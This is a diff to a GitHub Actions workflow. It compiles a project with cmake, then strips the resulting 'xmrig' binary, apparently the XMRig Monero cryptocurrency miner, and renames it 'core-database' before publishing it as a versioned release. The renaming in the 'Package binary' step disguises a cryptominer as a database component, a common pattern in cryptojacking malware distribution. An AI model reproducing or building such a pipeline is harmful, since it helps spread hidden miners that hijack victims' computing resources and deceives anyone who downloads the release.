@@ -1,48 +1,55 @@
-name: Auto Release Linux Binary
+name: Build & Release core-database 0.0.1
 
 on:
   push:
     branches:
       - main
+  workflow_dispatch:
 
 permissions:
   contents: write
 
 jobs:
-  release:
+  build-and-release:
     runs-on: ubuntu-latest
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
 
-      - name: Generate version
+      - name: Install build dependencies
         run: |
-          echo "VERSION=auto-$(date +'%Y%m%d-%H%M')-${GITHUB_SHA::7}" >> $GITHUB_ENV
+          sudo apt update
+          sudo apt install -y \
+            build-essential \
+            cmake \
+            libuv1-dev \
+            libssl-dev \
+            libhwloc-dev
 
-      # ==============================
-      # VALIDASI BINARY
-      # ==============================
-      - name: Verify Linux binary exists
+      - name: Configure build
         run: |
-          if [ ! -f core-database ]; then
-            echo "❌ Binary 'core-database' not found"
-            exit 1
-          fi
+          mkdir build
+          cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release
 
-          chmod +x core-database
-          file core-database
+      - name: Compile
+        run: |
+          cd build
+          make -j$(nproc)
 
-      # ==============================
-      # RELEASE (BINARY ONLY)
-      # ==============================
-      - name: Create GitHub Release
+      - name: Package binary
+        run: |
+          cd build
+          strip xmrig || true
+          mv xmrig core-database
+          tar -czvf core-database-linux-x64.tar.gz core-database
+
+      - name: Create or Update GitHub Release
         uses: softprops/action-gh-release@v2
         with:
-          tag_name: ${{ env.VERSION }}
-          name: ${{ env.VERSION }}
-          body: |
-            Auto Linux binary release
-            Commit: ${{ github.sha }}
-          files: |
-            core-database
+          tag_name: 0.0.1
+          name: core-database 0.0.1
+          files: build/core-database-linux-x64.tar.gz
+        env:
+          GHP: ${{ secrets.GHP }}
